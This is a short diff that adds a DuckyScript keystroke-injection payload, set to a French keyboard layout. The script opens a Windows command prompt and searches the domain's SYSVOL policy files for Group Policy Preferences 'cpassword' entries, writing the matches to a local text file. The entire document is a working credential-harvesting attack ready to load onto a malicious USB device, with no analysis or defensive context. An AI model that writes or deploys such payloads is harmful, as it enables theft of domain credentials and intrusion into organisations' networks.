@@ -1,0 +1,12 @@
+LOCALE FR
+DELAY 2000
+GUI r
+DELAY 1000
+DELETE
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml > GPPpwd.txt
+DELAY 1000
+ENTER
